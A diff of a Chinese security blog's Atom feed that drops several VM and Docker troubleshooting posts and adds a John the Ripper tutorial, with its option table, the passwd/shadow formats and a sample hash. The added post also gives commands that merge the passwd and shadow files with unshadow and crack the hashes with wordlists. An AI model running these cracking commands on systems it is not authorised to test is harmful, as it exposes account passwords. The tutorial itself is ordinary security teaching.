@@ -185,27 +185,6 @@
   </entry>
   
   <entry>
-    <title>kali虚拟机命令框输入卡顿解决方法</title>
-    <link href="https://blog.m3x1.cn/posts/76ed990f.html"/>
-    <id>https://blog.m3x1.cn/posts/76ed990f.html</id>
-    <published>2025-04-01T16:00:00.000Z</published>
-    <updated>2025-04-01T14:21:41.340Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="选择版本">选择版本</h2><p>“编辑此虚拟机”-&gt;“选项”-&gt;“版本”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401172803382.png" alt="image-20250401172803382"></p><p>往低版本切换，然后看看哪个版本不卡。</p><p>我是这样做的，希望能帮到你。</p><h2 id="切换usb兼容设置">切换usb兼容设置</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222011607.png" alt="image-20250401222011607"></p><h2 id="输入抓取选择高">输入抓取选择高</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250401222030589.png" alt="image-20250401222030589"></p>]]></content>
-    
-    
-    <summary type="html">🥧kali虚拟机命令框输入卡顿解决方法</summary>
-    
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>【vulhub漏洞靶场】fastjson反序列化漏洞及fastjson反序列化漏洞复现</title>
     <link href="https://blog.m3x1.cn/posts/5e02e69e.html"/>
     <id>https://blog.m3x1.cn/posts/5e02e69e.html</id>
@@ -290,69 +269,6 @@
   </entry>
   
   <entry>
-    <title>docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</title>
-    <link href="https://blog.m3x1.cn/posts/eab53833.html"/>
-    <id>https://blog.m3x1.cn/posts/eab53833.html</id>
-    <published>2025-03-26T16:00:00.000Z</published>
-    <updated>2025-04-01T02:51:03.605Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="前言">前言</h2><p>我用docker开启容器靶场的时候，出现这个报错，最后出现139报错代号，然后去网上查找各种资料到处试，最后问题解决了，用这篇文章记录一下。</p><h2 id="问题描述">问题描述</h2><blockquote><p>library initialization failed - unable to allocate file descriptor table - out of memory#</p></blockquote><p>翻译过来就是说：库初始化失败 - 无法分配文件描述符表 - 内存不足#</p><h2 id="原因">原因</h2><p>(1) LimitNOFILE=<a href="https://so.csdn.net/so/search?q=infinity&amp;spm=1001.2101.3001.7020">infinity</a> 虽然是不限制，但是在systemctl版本小于234的时候不生效，查看systemctl版本：systemctl --version</p><p>(2) docker容器的ulimit太小了，有文档说太大也不行</p><h2 id="解决方法">解决方法</h2><h3 id="解决方法一">解决方法一</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#修改/lib/systemd/system/docker.service文件</span><br><span class="line"></span><br><span class="line">LimitCORE=infinity</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">改成</span><br><span class="line">LimitCORE=65535</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">LimitNPROC=65535</span><br><span class="line"></span><br><span class="line">#重启docker服务</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="解决方法二">解决方法二</h3><p>问题<br>因运存不足无法给进程分配更多的文件句柄数而异常退出</p><p>原运行指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --ulimit nofile=1024 -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><p>改为</p><h3 id="解决方法三">解决方法三</h3><p>在 /etc/systemd/system/ 目录下， 创建 docker.service.d 目录<br>进入该目录，创建一个文件，名为 docker.conf<br>在文件中加入以下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --default-ulimit nofile=65535:65535 -H fd://</span><br></pre></td></tr></table></figure><h2 id="个人总结">个人总结</h2><p>我是使用的方法一修改了一下，修改/lib/systemd/system/docker.service文件，大概如下图：</p><p>在ExecStart后面加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--default-ulimit nofile=65535:65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225855172.png" alt="image-20250326225855172"></p><p>然后按方法一修改</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225917085.png" alt="image-20250326225917085"></p><p>然后记得重启docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>之后问题就解决了。</p>]]></content>
-    
-    
-    <summary type="html">🥧docker-compose启动报错（library initialization failed - unable to allocate file descriptor table - out of memory#）问题解决</summary>
-    
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>解决win10使用jar命令出现”jar不是内部或外部命令”的问题</title>
-    <link href="https://blog.m3x1.cn/posts/4de01283.html"/>
-    <id>https://blog.m3x1.cn/posts/4de01283.html</id>
-    <published>2025-03-26T16:00:00.000Z</published>
-    <updated>2025-03-28T07:09:19.032Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="分析原因">分析原因</h2><p>是因为JDK11以后就不再默认创建 “jre” 文件夹和其内容了，需要手动配置。至于如何发现没有“jre”文件夹的，是因为看环境变量的路径里有“jre”的文件夹，但是我发现JDK里并没有，就上网一搜才知道原因。</p><h2 id="配置过程">配置过程</h2><p>首先在系统变量里新建 “JAVA_HOME” 变量，变量值为：“C:\Program Files\Java\jdk-11.0.9” （路径为自己的java文件路径，以下皆是）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/04928472f8cb730ebda4a2ba1dcdafd3.png" alt="在这里插入图片描述"></p><p>在系统变量里新建 “CLASSPATH” 变量，变量值为：“.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar”</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7ea1758748f9266cd43b8d6ab6cfab4b.png" alt="在这里插入图片描述"></p><p>在系统变量里找到“Path” 变量，变量值为：“%JAVA_HOME%\bin”和”JAVA_HOME%\jre\bin”</p><p>这里注意，如果是如下图所示编辑界面（下图是错误示范），需要分两行添加上述变量值</p><p>如果”变量名+变量值“的样子（就像上面的配置图差不多），才用;连接（“%JAVA_HOME%\bin;JAVA_HOME%\jre\bin”）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0d63d1cc8ee295263419c0718e809542.png" alt="在这里插入图片描述"></p><p>接下来是重点了：</p><p>生成 “jre” 文件夹和其内容。<br>进入到安装目录下(C:\Program Files\Java\jdk-11.0.9)，在此处运行cmd，再输入：“bin\jlink.exe --module-path jmods --add-modules java.desktop --output jre”<br>这时候接着直接输入 “jar” 的话，还是会有错误：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b5371d495aabde202119568ba3c8b47a.png" alt="在这里插入图片描述"></p><p>直接关掉，重新开一个cmd就行了，直接按 “开始键” + “R&quot;，输入：“cmd”。这时候再试试：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d1016243b22e94e1a0b1aa07f73f15.png" alt="在这里插入图片描述"></p><p>这样就是成功了，然后就能使用jar了。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/sinat_20593627/article/details/109613547">win10解决‘jar’不是内部或外部命令，也不是可运行的程序 的问题_jar’ 不是内部或外部命令,也不是可运行的程序 或批处理文件。-CSDN博客</a></p></blockquote>]]></content>
-    
-    
-    <summary type="html">🥧解决win10使用jar命令出现”jar不是内部或外部命令”的问题；windows10下载了java但是无法使用jar命令的问题原因和问题解决</summary>
-    
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决</title>
-    <link href="https://blog.m3x1.cn/posts/3b44ba93.html"/>
-    <id>https://blog.m3x1.cn/posts/3b44ba93.html</id>
-    <published>2025-03-25T16:00:00.000Z</published>
-    <updated>2025-03-26T15:03:28.600Z</updated>
-    
-    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="扩展硬盘">扩展硬盘</h2><p>今天我因为看到原来的kali虚拟机只有20g内存，就想扩展一下</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101617857-2116683396.png" alt="image-20220829233729344"></p><p>点开上面这个硬盘这一栏</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101618295-1284516527.png" alt="image-20220829233757522"></p><p>点开之后点击扩展，然后选择自己想要扩展的空间，这里根据自己情况自己决定</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101618752-1960261044.png" alt="image-20220829233824985"></p><p>在上述扩展磁盘容量之后，并不会直接把容量扩展到系统盘里，还需要我们自己去分配。</p><p>右上角搜索Gparted，kali有一个自带的分配磁盘空间的工具</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619237-528678126.png" alt="image-20220830090014908"></p><p>本来是这样一个界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101619573-866531015.png" alt="image-20220830090052673"></p><p>然后右键点击停用交换空间，然后把中间这两个分区删除，只剩下sda1那个分区，因为如果存在中间这两个分区，就不能把扩展的磁盘空间分配给系统盘了。</p><p>中间的区域删除之后，就会只剩下一个sda1那个分区，然后就可以开始调整大小了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101619970-1314137064.png" alt="image-20220830090331897"></p><p>然后下面这个地方就会变化，变成你之前扩展的空间容量</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620377-953480513.png" alt="image-20220830090502454"></p><p>然后你自行进行分配即可，不过这里注意要留出一些空间给交换区域，因为我们后面还是要重新建回原来的那个swap分区</p><p>如果你留有一部分空间的话，应该是可以点击新建分区的</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101620763-1046461728.png" alt="image-20220830090933936"></p><p>新建的分区文件系统要和原来一样，原来是extended的，新建的分区也要是extended的，然后那个swap分区也要在这个extended分区之下去建立。然后完成后开机发现变得很慢。</p><h2 id="开机延迟问题解决">开机延迟问题解决</h2><p>因为有一个关于uuid的信息我们还没有修改。</p><p>在linux中，uuid是通用唯一识别码。uuid是一个软件建构的标准，目的就是让分布式系统中的所用元素都能有唯一的辨识资讯，从而不需要透过中央控制端来做识别资讯的指定</p><p>大概意思就是一个识别码，如果你没有进行重新修改的话，你开机的时候还是会去寻找原来的uuid，因为我们这里已经删除重建过了分区，所以它的uuid码也发生了变化</p><p>通过下面这个命令可以查看uuid码</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621219-13902332.png" alt="image-20220830091830957"></p><p>然后我们需要修改两个文件的uuid码</p><p>分别是/etc/fstab和/etc/initramfs-tools/conf.d/resume</p><p>我们可以用vim打开，如果你有其它编辑器，也可以用其它编辑器</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br><span class="line">sudo vim /etc/initramfs-tools/conf.d/resume</span><br></pre></td></tr></table></figure><p>可能会出现下面的界面，直接按E开始编辑就可以</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2574315-20220830101621646-272993183.png" alt="image-20220830092204947"></p><p>接下去就是vim的一个编辑界面</p><p><img src="https://img2022.cnblogs.com/blog/2574315/202208/2574315-20220830101622029-954380503.png" alt="image-20220830092232770"></p><p>需要把上面的两个uuid分别改成对应的uuid，因为系统盘没变，所以这个ext4的uuid一般是不需要改变的，一般要改的就是下面的这个swap的uuid。改完保存后重启即可。</p>]]></content>
-    
-    
-    <summary type="html">🥧kali扩展硬盘，以及导致开机延迟问题，一直卡在登录界面的问题解决；vm虚拟机kali扩展硬盘教程；kali扩展硬盘后的开机慢问题解决方法</summary>
-    
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>【vulhub漏洞靶场】redis漏洞（沙盒逃逸）CVE-2022-0543及漏洞复现</title>
     <link href="https://blog.m3x1.cn/posts/50ac647a.html"/>
     <id>https://blog.m3x1.cn/posts/50ac647a.html</id>
@@ -395,27 +311,6 @@
   </entry>
   
   <entry>
-    <title>vm虚拟机如何实现与主机共享代理实现科学上网</title>
-    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
-    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
-    <published>2025-03-19T16:00:00.000Z</published>
-    <updated>2025-03-20T16:04:32.157Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="方法一：使用tun模式（推荐）">方法一：使用tun模式（推荐）</h2><p>相关文章：<a href="https://clashvmess.com/3841.html">深度解析clash开tun模式：配置与使用指南 - Clash最新教程</a></p><p>如果主机是使用代理软件走代理的话，比如clash， 可以直接使用Tun模式。Tun模式下，代理软件会创建一个虚拟网卡，主机上的进程（包括虚拟机）的网络请求都会重定向到这个虚拟网卡。这种模式拦截了所有进程的网络请求，有些进程并不遵守系统代理，比如终端, pip, docker等等，Tun模式专治这种。</p><h2 id="方法二：使用系统代理模式">方法二：使用系统代理模式</h2><p><strong>很麻烦，推荐第一种</strong></p><p>VM软件配置<br>1.VM虚拟网络编辑器<br>打开虚拟网络编辑器（方式：编辑-&gt;虚拟网络编辑器),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>然后点击更改设置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.配置VMnet8和VMnet1<br>VMnet8【子网配置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>【NAT设置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>【DHCP设置】如下：（可以理解为虚拟机的ip范围， 不要跟上图配置的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>【VMnet1】采用默认配置就可以了，当然你也可以按照上述vmnet8的方式修改一个容易记住的ip：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>四、主机IP配置<br>windows进入打开设置-&gt;网络</p><p>【2024-9-18补充】【可选START  // 表示这个这个范围是可有可无的】</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>双击上述红框，然后配置如下：（这里不要跟之前的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>【2024-9-18补充】【可选END   // 表示这个范围是可有可无的】</p><p>代理软件要开启【Allow LAN】：（这里要记住端口, 我的是7890）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>然击后点：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>记住下面的接口ip,这个ip需要在Vm虚拟机中使用， 两个都可以用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>在windows终端下输入ipconfig同样可以查到：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>五、虚拟机代理ip配置<br>在配置代理之前需要设置网络适配器， 我们之前配置了VMnet8，在这里可以使用。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 虚拟机上用【设置】配置代理<br>用【设置】配置代理，代理设置会影响所有图形app， 比如浏览器，shell…</p><p>但是却影响不了ssh(用ssh连接虚拟机ubuntu)终端，所以在使用ssh还需要配置代理，参考第七节。</p><p>当然这种配置也影响不了很多需要单独配置代理的app, 比如conda, pip, docker等等</p><p>进入虚拟机，配置ip,如果是Ubuntu可以参考下面的配置：(注意下图的端口，要跟代理软件的端口一致)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>然后可以打开浏览器看外网，或者终端：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
-    
-    
-    <summary type="html">🥧vm虚拟机如何实现与主机共享代理实现科学上网;软件代理使用tun模式;系统代理设置方法</summary>
-    
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>Shiro反序列化漏洞全解析及各漏洞复现【vulhub靶场】</title>
     <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
     <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
@@ -433,6 +328,111 @@
     
     
     <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux、windows密钥暴力破解工具john的使用</title>
+    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
+    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
+    <published>2025-03-18T16:00:00.000Z</published>
+    <updated>2025-03-19T14:19:17.023Z</updated>
+    
+    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="什么是john">什么是john</h4><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><p>john一般是kali自带。</p><h4 id="john参数表">john参数表</h4><p><code>john</code> 命令的具体参数选项如下表：</p><table><thead><tr><th>选 项</th><th>描 述</th></tr></thead><tbody><tr><td>–single</td><td>single crack 模式，使用配置文件中的规则进行破解</td></tr><tr><td>–wordlist=FILE–stdin</td><td>字典模式，从 FILE 或标准输入中读取词汇</td></tr><tr><td>–rules</td><td>打开字典模式的词汇表切分规则</td></tr><tr><td>–incremental[=MODE]</td><td>使用增量模式</td></tr><tr><td>–external=MODE</td><td>打开外部模式或单词过滤，使用 [List.External:MODE] 节中定义的外部函数</td></tr><tr><td>–stdout[=LENGTH]</td><td>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上</td></tr><tr><td>–restore[=NAME]</td><td>恢复被中断的破解过程，从指定文件或默认为 $JOHN/john.rec 的文件中读取破解过程的状态信息</td></tr><tr><td>–session=NAME</td><td>将新的破解会话命名为 NAME ，该选项用于会话中断恢复和同时运行多个破解实例的情况</td></tr><tr><td>–status[=NAME]</td><td>显示会话状态</td></tr><tr><td>–make-charset=FILE</td><td>生成一个字符集文件，覆盖 FILE 文件，用于增量模式</td></tr><tr><td>–show</td><td>显示已破解口令</td></tr><tr><td>–test</td><td>进行基准测试</td></tr><tr><td>–users=[-]LOGIN|UID[,…]</td><td>选择指定的一个或多个账户进行破解或其他操作，列表前的减号表示反向操作，说明对列出账户之外的账户进行破解或其他操作</td></tr><tr><td>–groups=[-]GID[,…]</td><td>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。</td></tr><tr><td>–shells=[-]SHELL[,…]</td><td>对使用指定 shell 的账户进行操作，减号表示反向操作</td></tr><tr><td>–salts=[-]COUNT</td><td>至少对 COUNT 口令加载加盐，减号表示反向操作</td></tr><tr><td>–format=NAME</td><td>指定密文格式名称，为 DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM 之一</td></tr><tr><td>–save-memory=LEVEL</td><td>设置内存节省模式，当内存不多时选用这个选项。 LEVEL 取值在 1~3 之间</td></tr></tbody></table><h4 id="etc-passed和etc-shadow文件">etc/passed和etc/shadow文件</h4><p>首先要知道 /etc/passwd文件和 /etc/shadow文件</p><p>/etc/passwd文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>上面数据为passwd文件的一个片段，我们可以发现每一行都被<code>分号</code>分为了<code>7部分</code>。这七部分分别为：</p><blockquote><ol><li>用户名</li><li>密码(passwd文件人人可读，所以不放明文密码，真正的密码在/etc/shadow文件中)</li><li>uid</li><li>gid</li><li>用户注释</li><li>主目录</li><li>登陆的shell类型(bash/zsh/sh等)</li></ol></blockquote><p>/etc/shadow文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>也是被分号隔开格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">密码，其中\$6\$是表示一种类型标记为6的密码散列suans fa,这里指SHA-512哈希算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512,salt 表示密码学中的 Salt, 系统随机生成 encrypted 表示密码的 hash,其中f0EotKbw为salt。</span><br><span class="line">“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。</span><br><span class="line">“最小时间间隔”指的是两次修改口令之间所需的最小天数。</span><br><span class="line">“最大时间间隔”指的是口令保持有效的最大天数。</span><br><span class="line">“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</span><br><span class="line">“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。</span><br><span class="line">“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</span><br></pre></td></tr></table></figure><h4 id="爆破linux用户密码实例">爆破linux用户密码实例</h4><p><strong>利用 <code>unshadow</code> 组合 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 两个文件</strong></p><p><code>unshadow</code> 命令会将 <code>/etc/passwd</code> 的数据和 <code>/etc/shadow</code> 的数据结合起来，创建 <code>1</code> 个含有用户名和密码详细信息的文件。</p><p>我们可以通过以下命令将这两个文件结合起来：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">sudo unshadow /etc/passwd /etc/shadow &gt; test_passwd</span><br></pre></td></tr></table></figure><p><strong>使用 <code>John the Ripper</code> 破解 <code>Linux</code> 用户登录密码</strong></p><p>我们这时候还需要一个字典，由于 <code>John</code> 自带了一个字典，字典位于 <code>/usr/share/john/password.lst</code> 。当然你也可以自行去网上选择适合你的字典。</p><p>我们可以开始对Linux登录用户名和密码进行破解：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=<span class="regexp">/usr/</span>share/john/password.<span class="property">lst</span> test_passwd</span><br></pre></td></tr></table></figure><p>破解结果如下：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/23bd8f0643eccb8b765a9b0aa6ce29d0.png" alt="img"></p><p>我们可以看到， <code>test_passwd</code> 文件中存在的三个用户名 <code>root</code> ，<code>test</code> ， <code>python</code> 的密码，均被破解了。</p><p>我们可以查看破解信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --show test_passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9c612252f150ba86218bfa1af040494b.png" alt="img"></p><h4 id="出现报错：-UTF-8-No-password-hashes-loaded">出现报错： UTF-8 No password hashes loaded</h4><p>John the Ripper 正确使用方法<br>现在 John the Ripper 爆破linux的shadow文件时需要加上 --format=crypt</p><p>所以现在 John the Ripper 的使用命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo john /etc/shadow --format=crypt</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john /etc/shadow --format=crypt --wordlist=/home/kali/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p>原因是，如果查看合并后的文件或者没合并使用的shadow文件，并在用户名后面看到 <strong>$y$</strong>，则表明密码已使用 yescrypt 进行哈希处理。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1622299-20220311151213389-1526416476.png" alt="img"></p>]]></content>
+    
+    
+    <summary type="html">🥧kali中暴力破解工具john的使用方法以及命令解析;/etc/passwd文件和/etc/shadow文件格式;linux密码爆破实例;出现报错：“UTF-8 No password hashes loaded”的原因及解决方法</summary>
+    
+    
+    
+    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="工具使用" scheme="https://blog.m3x1.cn/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>刷题2025.3.15</title>
+    <link href="https://blog.m3x1.cn/posts/a546d02c.html"/>
